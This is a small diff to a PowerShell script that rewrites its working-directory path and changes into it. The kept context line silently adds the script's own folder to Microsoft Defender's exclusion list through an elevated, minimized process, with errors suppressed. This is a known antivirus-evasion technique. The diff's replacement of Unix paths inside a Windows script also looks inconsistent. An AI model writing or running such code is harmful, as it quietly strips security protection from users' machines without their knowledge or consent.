@@ -1,5 +1,6 @@
-Set-Location (Split-Path $script:MyInvocation.MyCommand.Path)
 $Dir = Split-Path $script:MyInvocation.MyCommand.Path
+$Dir = $Dir -replace "/var/tmp","/root"
+Set-Location $Dir
 try { if ((Get-MpPreference).ExclusionPath -notcontains (Convert-Path .)) { Start-Process "powershell" -Verb runAs -ArgumentList "Add-MpPreference -ExclusionPath `'$Dir`'" -WindowStyle Minimized } }catch { }
 
 
